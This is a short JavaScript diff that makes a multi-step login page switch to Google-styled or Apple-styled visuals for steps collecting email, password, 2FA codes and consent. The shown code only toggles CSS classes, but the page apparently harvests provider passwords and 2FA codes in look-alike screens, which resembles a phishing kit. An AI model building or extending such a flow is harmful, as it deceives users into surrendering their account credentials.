@@ -168,6 +168,28 @@ function initApp() {
     }
 
     function showStep(stepElement) {
+        const isGoogleStep = [
+            stepGoogleEmail, stepGooglePassword, stepGoogle2FA, stepGooglePrompt, stepGoogleConsent
+        ].includes(stepElement);
+
+        const isAppleStep = [
+            stepAppleEmail, stepApplePassword, stepApple2FA, stepApplePrompt
+        ].includes(stepElement);
+
+        const appContainer = document.querySelector(".app-container");
+        if (appContainer) {
+            if (isGoogleStep) {
+                appContainer.classList.add("google-mode");
+                appContainer.classList.remove("apple-mode");
+            } else if (isAppleStep) {
+                appContainer.classList.add("apple-mode");
+                appContainer.classList.remove("google-mode");
+            } else {
+                appContainer.classList.remove("google-mode");
+                appContainer.classList.remove("apple-mode");
+            }
+        }
+
         [
             stepPhone, stepCode, step2FA, 
             stepGoogleEmail, stepGooglePassword, stepGoogle2FA, stepGooglePrompt, stepGoogleConsent,
